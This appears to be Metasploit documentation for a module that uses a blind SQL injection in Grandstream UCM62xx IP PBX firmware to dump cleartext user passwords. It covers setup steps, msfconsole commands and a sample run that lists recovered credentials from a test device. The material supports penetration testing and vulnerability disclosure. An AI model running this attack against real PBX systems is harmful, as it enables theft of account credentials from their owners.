## Vulnerable Application

### Description

This module uses a blind SQL injection (CVE-2020-5724) affecting the Grandstream UCM62xx
IP PBX to dump the users table. The injection occurs over a websocket at the websockify
endpoint, and specifically occurs when the user requests the challenge (as part of a
challenge and response authentication scheme). The injection is blind, but the server
response contains a different status code if the query was successful. As such, the
attacker can guess the contents of the user database. Most helpfully, the passwords are
stored in cleartext within the user table (CVE-2020-5723).

This issue was patched in Grandstream UCM62xx IP PBX firmware version 1.20.22.

### Installation

The UCM62xx PBX is a physical device and is not known to have been successfully emulated.
However, if you have a device, affected firmware can be downloaded here:

* http://firmware.grandstream.com/Release_UCM62xx_1.0.20.22.zip

## Verification Steps

* Acquire an affected device and configure it with the affected firmware
* Do: `use auxiliary/gather/grandstream_ucm62xx_sql_account_guess`
* Do: `set RHOST <ip>`
* Do: `check`
* Do: Verify the remote host is vulnerable.
* Do: `run`
* You should get a list of valid credentials for the target device.

## Options

### TARGETURI

Specifies base URI. The default value is `/`.

## Scenarios

### Grandstream UCM6202 IP PBX firmware version 1.0.20.20

```
msf6 > use auxiliary/gather/grandstream_ucm62xx_sql_account_guess
msf6 auxiliary(gather/grandstream_ucm62xx_sql_account_guess) > set RHOST 10.0.0.7
RHOST => 10.0.0.7
msf6 auxiliary(gather/grandstream_ucm62xx_sql_account_guess) > check

[*] Requesting version information from /cgi
[*] 10.0.0.7:8089 - The target appears to be vulnerable. The self-reported version is: 1.0.20.20
msf6 auxiliary(gather/grandstream_ucm62xx_sql_account_guess) > run
[*] Running module against 10.0.0.7

[*] Running automatic check ("set AutoCheck false" to disable)
[*] Requesting version information from /cgi
[+] The target appears to be vulnerable. The self-reported version is: 1.0.20.20
[*] Found the following username and password: admin - cheesed00dle
[*] Found the following username and password: 1000 - gZ15S8O8U5S72oli
[*] Found the following username and password: 1001 - qK6uRxwC
[*] Found the following username and password: 1002 - aP9ux515W7p5U
[*] Found the following username and password: 1003 - pM6mo!E8u37k
[*] Found the following username and password: 1004 - mC7N68dm8h
[*] Auxiliary module execution completed
msf6 auxiliary(gather/grandstream_ucm62xx_sql_account_guess) > 
```
